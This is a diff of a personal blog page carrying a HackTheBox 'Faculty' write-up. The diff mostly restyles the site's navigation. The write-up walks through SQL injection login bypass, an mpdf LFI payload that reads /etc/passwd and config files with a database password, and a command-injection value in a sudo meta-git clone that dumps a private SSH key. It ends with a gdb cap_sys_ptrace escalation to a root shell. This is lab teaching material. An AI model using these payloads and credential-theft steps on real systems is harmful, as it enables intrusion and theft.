@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html>
+<html id="doc" class="">
 <div id="particles-js">
 <head>
     <meta charset="UTF-8">
@@ -16,13 +16,22 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script src="/Scripts/js/particles.js"></script>
     <script src="/Scripts/js/app.js"></script>
-<title>Faculty HTB Writeup | 0xv01d</title>
-<meta property="og:locale" content="en_US">
-<script type="application/ld+json">
-</script>
+    <title>Faculty HackTheBox Writeup | 0xv01d</title>
+    <meta property="og:locale" content="en_US">
+    <script type="application/ld+json">
+    </script>
 
-    <link rel="stylesheet" href="/Styles/style.css?v=">
+  <link rel="stylesheet" href="/Styles/style.css?v=">
 	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+    <!-- Bootstrap CSS -->
+    <!--<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>-->
+	<link rel="stylesheet" href="/Styles/style_darkwing.css">
+	<link rel="stylesheet" href="/Styles/footer.css">
+  <script src="/Scripts/js/bar.js"></script>
+
+
 <!-- Setup Google Analytics -->
 
 	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/faculty/favicon.ico">
@@ -31,33 +40,130 @@
 
   </head>
   <body>
-      <header class="app-header">
-        <a href="https:0xv01d.github.io">
-          <img class="avatar" src="/images/index/avatar.png">
-		</a><p></p>
-		<h1><strong>0xv01d</strong></h1>
-		<nav class="app-header-menu">
-			<a class="app-header-menu-item" href="/">Home</a>
-             - 
-			<a class="app-header-menu-item" href="/tags/">Tags</a>
-             - 
-			<a class="app-header-menu-item" href="/about/">About</a>
-		</nav>
-		<p>Just another computer adict.</p>
-		<div text-align:="" center;="" width:="" 100%;="" class="app-header-media">
-			<a class="fab fa-github-square" href="https://github.com/0xv01d" rel="noreferrer noopener" target="_blank"><img src="/images/index/github.png"></a>
-			<a class="fab fa-envelope-square" href="mailto:im_0xv01d@outlook.com" rel="noreferrer noopener" target="_blank"><img src="/images/index/email.png"></img></a>
-			<a href="https://discord.com/users/504974900239400961" class="fab fa-discord" rel="noreferrer noopener" target="_blank"></a>
-			<a class="fab fa-twitter-square" href="https://twitter.com/0xEr3bus" rel="noreferrer noopener" target="_blank"></a>
-		</div>
-        <a href="https://www.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
-			<img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
-        </a>
-        <div style="height: 7rem;"></div>
-      </header>
 
-      <main class="app-container">
-		
+        <aside id="menu" class="hide">
+            <div class="inner flex-row-vertical">
+                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+                    <i class="icon icon-lg icon-times-circle"></i>
+                    <!--        <i class="icon icon-lg icon-close"></i>-->
+                </a>
+                <div class="brand-wrap avatar-wrapper">
+                    <!--    <div class="brand-wrap avatar-wrapper" style="background-image:url(/images/index/avatar.png);"> -->
+                    <a href="https:0xv01d.github.io">
+                        <img class="avatar shake" src="/images/index/avatar.png">
+
+                    </a>
+                    <p></p>
+                    <h1 class="tubelight"><strong>0xv01d</strong></h1>
+                </div>
+
+                <div class="scroll-wrap flex-col">
+                    <ul class="nav">
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/">
+                                <i class="icon icon-lg icon-home"></i>
+                                Home
+                            </a>
+                        </li>
+<!--
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-archives"></i>
+                                Archives
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-tags"></i>
+                                Tags
+                            </a>
+                        </li>
+-->
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://github.com/0xv01d" target="_blank">
+                                <i class="icon icon-lg icon-github"></i>
+                                Github
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://infosec-0xv01d.medium.com/" target="_blank">
+                                <i class="icon_new fa-brands fa-medium"></i>
+                                <!--                <i class="icon icon-lg icon-medium"></i>-->
+                                Medium
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.youtube.com/@0xv01d_infosec" target="_blank">
+                                <i class="icon_new fa-brands fa-youtube"></i>
+                                Youtube
+                            </a>
+                        </li>
+                        
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#" target="_blank">
+                                <i class="icon_new fa-brands fa-twitch"></i>
+                                Twitch
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.linkedin.com/in/isaac-david-g-7bb187318?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app" target="_blank">
+                                <i class="icon_new fa-brands fa-linkedin"></i>
+                                Linkedin
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/about">
+                                <i class="icon icon-lg icon-link"></i>
+                                About
+                            </a>
+                        </li>
+                    </ul>
+                    <a style="padding-left: 0.7rem; padding-top: 3rem;"
+                        href="https://app.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+                        <img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+      <main id="main">
+<!--        class="app-container"> -->
+<div class="fixed-top" id="message"></div>
+      <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle" style="padding-right: 0.4rem;">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis" style="visibility: visible;">Faculty - HackTheBox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="fa-solid fa-language"></i>
+<!--                <i class="icon icon-lg icon-language"></i>-->
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+
+      </header>
+      
+  <div class="container body-wrap">
+
 		<article class="post">		
 			<header class="post-header">
 
@@ -93,11 +199,13 @@
 			to read another user's ssh directory, and finally abuse<a href="https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc?gi=a7e86ad0b7b" rel="noreferrer noopener" target="_blank"> cap_sys_ptrace</a> to spawn a suid shell.</p>
 
 <!--Machine Resolution-->
-			<h1 id="header-1">Recon</h1>
+<h1 id="reconnaissance" class="toc-add toc-title">Reconnaissance</h1>
+<h2 id="port_scan" class="toc-add">Port-Scan</h2>
 
 			<p>Let's start with a basic port scan</p>
 
-			<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+			<div class="language-js highlighter-rouge"><div class="highlight">
+        <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 # Nmap 7.92 scan initiated Mon Sep 19 14:06:49 2022 as: nmap -p22,80 -sCV -vvv -n -Pn -oN targeted 10.10.11.169
 <span class="kt">Nmap scan </span><span class="ld">report </span><span class="gd">for </span><span class="s">10.10.11.169</span>
 <span class="kt">Host </span><span class="ld">is up, received user-set (0.25s latency).</span>
@@ -125,10 +233,12 @@
 
 			</code></pre></div></div>
 
-			<p class="head-img">After doing some enumeration with whatweb, we can see a redirect, let's take a look at the login</p>
-			
+<h2 id="Web_Enumeration_with_whatweb" class="toc-add">Web Enumeration</h2>
 
-		<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+			<p class="head-img">After doing some enumeration with whatweb, we can see a redirect, let's take a look at the login</p>			
+
+		<div class="language-plaintext highlighter-rouge"><div class="highlight">
+      <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> whatweb </span>http://faculty.htb
 http://faculty.htb [302 Found] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, RedirectLocation[login.php], Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
 http://faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.169], JQuery, Script[text/javascript], Title[School Faculty Scheduling System], nginx[1.18.0]
@@ -137,9 +247,12 @@ http://faculty.htb/login.php [200 OK] Bootstrap, Cookies[PHPSESSID], Country[RES
 			<p class="head-img">After taking a look at the source, we can't find anything, we'll enumerate some directories and then play around with the login and see if it's vulnerable to sql injection</p>
 			<img class="img-post" style="max-width: 408px;" src="/images/HTB/faculty/login_php.png"></img>
 
+<h2 id="Directory_Enumeration_with_gobuster" class="toc-add">Directory Enumeration</h2>
+
 			<p class="head-img">And we got an admin directory, we can see what's in there but first let's get in</p>
 	
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                  
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>                                  
 <span class="na">❯</span><span class="ld"><span class="kt"> gobuster </span>dir -u faculty.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
 ===============================================================
 Gobuster v3.1.0
@@ -163,17 +276,28 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 </span> </code></pre></div></div>
 			
+<h1 id="foothold" class="toc-add toc-title" style="padding-top: 2rem;">Foothold</h1>
+<h2 id="SQL Injection" class="toc-add">SQL Injection</h2>
+
 			<p class="head-img">Apparently it's vulnerable to sqli, and also exfiltrates the path from admin_class.php, let's keep it and try to bypass it</p>
 			<img class="img-post" style="max-width: 407px;" src="/images/HTB/faculty/login_exfiltrated_data.png"></img>
+
+<h3 id="Bypassing_Login_Panel" class="toc-add" style="margin-top: 2rem;">Bypassing Login Panel</h3>
 
 			<p class="head-img">With a basic injection we are in, now let's go to the admin directory</p>
 			<img class="img-post" style="max-width: 415px;" src="/images/HTB/faculty/login_bypass.png"></img>
 
+<h3 id="Accessing_the_Admin_Directory" class="toc-add" style="margin-top: 2rem;">Accessing the Admin Directory</h3>
+
 			<p class="head-img">It's the scheduling system, it has some sections, and each one has a table, apparently the data it's brought from the database, but also we can see a pdf generator that looks juicy we can play with it and then enumerate the db</p>
             <img class="img-post" style="max-width: 480px;" src="/images/HTB/faculty/scheduling_system_admin.png"></img>
 
+<h2 id="pdf_generator_exploitation" class="toc-add">PDF Generator Exploitation</h2>
+
             <p class="head-img">Once we click on it, it generates a pdf with the tables content, we can also see in the url that it uses mpdf to render it, let's pass it through burp to see how it's parsed</p>
             <img class="img-post" style="max-width: 511px;" src="/images/HTB/faculty/pdf_generator.png"></img>
+
+<h3 id="Decoding_and_Understanding_Payloads" class="toc-add" style="margin-top: 2rem;">Decoding and Understanding Payload</h3>
 
             <p class="head-img">Once we intercept the request we see the data, but it's encoded</p>
             <img class="img-post" style="max-width: 541px;" src="/images/HTB/faculty/pdf_request.png"></img>
@@ -181,9 +305,12 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
             <p class="head-img">We can decode the data from base64, and URL decode it twice. Once decoded, we can see they are html control tags for mpdf</p>
             <img class="img-post" style="max-width: 553px;" src="/images/HTB/faculty/pdf_request_decoded.png"></img>
 
+<h3 id="Exploiting_Local_File_Inclusion" class="toc-add" style="margin-top: 2rem;">Exploiting Local File Inclusion</h3>
+            
             <p class="head-img">Searching for some mpdf vuln, we found a Local File Inclusion, by taking a look at the exploit or just the mpdf <a href="https://mpdf.github.io/reference/html-control-tags/annotation.html">docs</a>, we can create our <a href="https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)URL_Encode(false)To_Base64('A-Za-z0-9%2B/%3D')&input=PGFubm90YXRpb24gZmlsZT0iL2V0Yy9wYXNzd2QiIGNvbnRlbnQ9Ii9ldGMvcGFzc3dkIi8%2B">payload</a> and encode it in the right format to list the /etc/passwd</p>
 
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> searchsploit </span>mpdf
 ----------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                   |  Path
@@ -200,6 +327,8 @@ Shellcodes: No Results
 
 </span> </code></pre></div></div>
 
+<h3 id="Enumerating_Users_via_LFI" class="toc-add" style="margin-top: 2rem;">Enumerating Users via LFI</h3>
+
             <p class="head-img">So, we gonna generate a pdf and intercept the request, so we can place our payload</p>
             <img class="img-post" style="max-width: 473px;" src="/images/HTB/faculty/sending_payload.png"></img>
 
@@ -207,15 +336,19 @@ Shellcodes: No Results
             <img class="img-post" style="max-width: 276px;" src="/images/HTB/faculty/attached_file.png"></img>
 
 			<p class="head-img">We got three users, let's try the same with the admin_class.php leaked before</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> cat </span>passwd | <span class="kt">grep</span> sh$
 root:x:0:0:root:/root:/bin/bash
 gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
 developer:x:1001:1002:,,,:/home/developer:/bin/bash
 </span> </code></pre></div></div>
 
+<h3 id="Getting_creds_from_config_files" class="toc-add" style="margin-top: 2rem;">Getting creds from config files</h3>
+
 	<p class="head-img">Once we download the file, we can see how the data is managed on the web, additionally we see another file, we have to repeat the process with this new file</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> cat </span>admin_class.php | <span class="kt">head</span> -n10
 <span class="s"><<span class="s">?php</span></span>
 <span class="kt">session_start</span>();
@@ -229,24 +362,31 @@ developer:x:1001:1002:,,,:/home/developer:/bin/bash
 </span> </code></pre></div></div>
 
             <p class="head-img">And we found something that looks like a cred, let's test it via SSH with the users we found earlier.</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> cat </span>db_connect.php
 <span class="s"><</span><span class="s">?php 
 
-$conn</span><span class="r">= </span>new <span class="na">mysqli</span><span class="r">(</span><span class="k">'localhost','sched','Co.met06aci.dly53ro.per','scheduling_db'</span><span class="r">)</span>or die<span class="r">(</span><span class="k">"Could not connect to mysql"</span><span class="r">.<span class="kt">mysqli_error</span><span class="s">($con)</span>);</span>
+$conn</span><span class="r">= </span>new <span class="na">mysqli</span  ><span class="r">(</span><span class="k">'localhost','sched','Co.met06aci.dly53ro.per','scheduling_db'</span><span class="r">)</span>or die<span class="r">(</span><span class="k">"Could not connect to mysql"</span><span class="r">.<span class="kt">mysqli_error</span><span class="s">($con)</span>);</span>
 </span> </code></pre></div></div>
 
+<h1 id="Initial_Access_(SSH)" class="toc-add toc-title" style="padding-top: 2rem;">Gbyolo Initial Access (SSH)</h1>
+
             <p class="head-img">It works with gbyolo, we're in, but there's no flag, we should probably get access to the developer account</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> ssh </span>gbyolo@faculty.htb
 gbyolo@faculty.htb's password: <span class="gi">Co.met06aci.dly53ro.per</span>
 You have mail.
 <span class="k">gbyolo@faculty:~$</span>
 </span> </code></pre></div></div>
 
-            <p class="head-img">After playing around for a while, we discovered that we can run meta-git with sudoers privileges. Looking for something interesting to play with, we found <a href="https://hackerone.com/reports/728040" rel="noreferrer noopener" target="_blank">RCE</a>.
+<h1 id="User_pivoting" class="toc-add toc-title" style="padding-top: 2rem;">User pivoting via Meta-Git</h1>
+
+            <p class="head-img">After playing around for a while, we discovered that we can run meta-git with sudoers privileges. Looking for something interesting to play with, we found a <a href="https://hackerone.com/reports/728040" rel="noreferrer noopener" target="_blank">RCE POC</a>.
 We could try to get a rev shell, but we'll just try to read the developer's .ssh and get some persistence</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="k">gbyolo@faculty:~$<span class="ld"><span class="kt"> sudo </span>-l
 [sudo] password for gbyolo: <span class="gi">Co.met06aci.dly53ro.per</span>
 Matching Defaults entries for gbyolo on faculty:
@@ -258,7 +398,8 @@ User gbyolo may run the following commands on faculty:
 </span> </code></pre></div></div>
 
             <p class="head-img">It worked, now let's log in as developer</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="k">gbyolo@faculty:~$</span> cd /tmp
 <span class="k">gbyolo@faculty:/tmp$</span> sudo -u developer meta-git clone 'RCE | cat ~/.ssh/id_rsa'
 meta git cloning into 'RCE | cat ~/.ssh/id_rsa' at id_rsa
@@ -304,16 +445,22 @@ YEeVKoox5zK4lPYIAgGJvhUTzSuu0tS8O9bGnTBTqUAq21NF59XVHDlX0ZAkCfnTW4IE7j
 -----END OPENSSH PRIVATE KEY-----
 </span> </code></pre></div></div>
 
+<h1 id="Developer_Access_(SSH)" class="toc-add toc-title" style="padding-top: 2rem;">Developer Access (SSH)</h1>
+
             <p class="head-img">We get the first flag now let's find a way to escalate privileges, after some digging with linpeas we find a <a href="https://github.com/Markakd/CVE-2022-2588" rel="noreferrer noopener" target="_blank">CVE-2022-2588</a> it will create a new user with root privileges but i won't take that path, also linpeas found out that gdb has cap_sys_ptrace which will allow us to attach some process and trace its system calls, so we can easily inject code to get a suid shell, let's try it</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="na">❯</span><span class="ld"><span class="kt"> ssh </span>-i id_rsa developer@faculty.htb
 <span class="k">developer@faculty:~$</span> cat user.txt 
 8fe3a0f93eae871028137d36bdf55b29
 <span class="k">developer@faculty:~$</span>
 </span> </code></pre></div></div>
 
+<h1 id="PrivEsc" class="toc-add toc-title">Privilege Escalation</h1>
+<h2 id="cap_sys_ptrace" class="toc-add">Abusing cap_sys_ptrace </h2>
             <p class="head-img">We take a process running as root, and attach it to gdb, and now we should have a privileged shell, we just have to call it</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="k">developer@faculty:~$</span><span class="ld"> gdb -p 699
 Attaching to process 699
 (gdb) 
@@ -331,7 +478,8 @@ Detaching from program: /usr/bin/python3.8, process 699
 
 
             <p class="head-img">That's it, we own it.</p>
-        <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+          <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
 <span class="ld"><span class="k">developer@faculty:~$</span> bash -p
 bash-5.0# id
 uid=1001(developer) gid=1002(developer) euid=0(root) groups=1002(developer),1001(debug),1003(faculty)
@@ -344,9 +492,185 @@ logout
 <span class="r">Connection to faculty.htb closed.</span>
 
 </span> </code></pre></div></div>
-<a href="#">Go back</a>
 		</article>
+
+<aside class="post-widget">
+   <nav class="post-toc-wrap fixed" id="post-toc">
+      <h4>Table of contents</h4>
+      <ol class="post-toc">
+      </ol>
+   </nav>
+</aside>
+
+<a href="https://www.buymeacoffee.com/0xv01d" target="_blank" style="margin-top: 1rem;"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
+
+    </div>
+<article id="wrap">
+	<article id="lightings">
+    	<section id="one">
+            <section id="two">
+                <section id="three">
+                    <section id="four">
+                        <section id="five">
+                            
+                        </section>
+                    </section>
+                </section>
+            </section>
+		</section>
+    </article>
+</article>
+
+    <footer class="footer">
+    <div class="bottom">
+        <p><span>0xv01d © 2022 - 2024</span>
+        </p>
+    </div>
+</footer> 
       </main>
+      <div id="mask" class="mask"></div>
+<a href="#" id="gotop" class="waves-effect waves-circle waves-light in"><span class="icon icon-lg icon-chevron-up"></span></a>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            var gotopButton = document.getElementById("gotop");
+
+            // Show/hide the button based on scroll position
+            window.addEventListener("scroll", function () {
+                if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                    gotopButton.style.opacity = "1";
+                } else {
+                    gotopButton.style.opacity = "0";
+                }
+            });
+
+            // Smooth scroll to top when the button is clicked
+            gotopButton.addEventListener("click", function (event) {
+                event.preventDefault();
+
+                // Use the scrollIntoView method with behavior: 'smooth'
+                document.body.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            });
+        });
+
+    </script>
+    <script>
+        function copyToClipboard(button) {
+            // Find the nearest .highlight parent of the clicked button
+            const codeElement = button.closest('.highlight');
+
+            if (codeElement) {
+                // Clone the code element to exclude the button
+                const codeClone = codeElement.cloneNode(true);
+
+                // Remove the button from the clone
+                const buttons = codeClone.querySelectorAll('.copy-btn');
+                buttons.forEach((btn) => btn.remove());
+
+                const codeText = codeClone.innerText;
+
+                // Create a temporary textarea element to copy the text
+                const textarea = document.createElement('textarea');
+                textarea.value = codeText;
+                document.body.appendChild(textarea);
+
+                // Select and copy the text
+                textarea.select();
+                document.execCommand('copy');
+
+                // Remove the temporary textarea
+                document.body.removeChild(textarea);
+
+                // Change the icon in the button to "fa-check"
+                const iconElement = button.querySelector('i');
+                if (iconElement) {
+                  iconElement.classList.remove('fa-clipboard');
+                  iconElement.classList.add('fa-check', 'green-icon');
+                }
+
+                // Temporarily change the icon back to "fa-clipboard" after 2000 milliseconds (2 seconds)
+                setTimeout(() => {
+                  if (iconElement) {
+                    iconElement.classList.remove('fa-check', 'green-icon');
+                    iconElement.classList.add('fa-clipboard');
+                  }
+                }, 2000);
+            } else {
+                console.error('Unable to find the code element');
+            }
+        }
+    </script>
+
+
+    <script>
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+        menu.classList.toggle('hide');
+    });
+
+    document.getElementById('menu-off').addEventListener('click', function() {
+        var menu = document.getElementById('menu');
+        // Agregar la clase 'hide' para ocultar el menú
+        menu.classList.add('hide');
+    });
+</script>
+
+<script>
+    function lock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.toggle('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.remove('hide')
+            menu.classList.toggle('show')
+            mask.classList.add('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+        }
+    }
+
+    function unlock() {
+        var doc = document.getElementById('doc');
+        var menu = document.getElementById('menu');
+        var mask = document.getElementById('mask');
+        var screenWidth = window.innerWidth;
+
+        if (screenWidth <= 1240) {
+            doc.classList.remove('lock');  // Toggle: Si tiene la clase 'hide', la quita; si no la tiene, la agrega
+            menu.classList.toggle('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        } else {
+            doc.classList.remove('lock');      // Agregar la clase 'hide' para ocultar el menú
+            menu.classList.add('hide')
+            menu.classList.remove('show')
+            mask.classList.remove('in')
+        }
+    }
+
+    // Llamar a la función al cargar la página y cuando se redimensiona la ventana
+//    window.addEventListener('load', lock);
+//    window.addEventListener('resize', unlock);
+
+    // Añadir el evento click al botón de menú
+    document.getElementById('menu-toggle').addEventListener('click', function() {
+        lock();  // Actualizar visibilidad del menú al hacer clic en el botón
+    });
+
+    // Añadir el evento click al botón de ocultar menú
+    document.getElementById('menu-off').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+    
+    document.getElementById('mask').addEventListener('click', function() {
+        unlock();  // Actualizar visibilidad del menú al hacer clic en el botón de ocultar
+    });
+</script>
+
+
   </body>
 </div>
 </html>
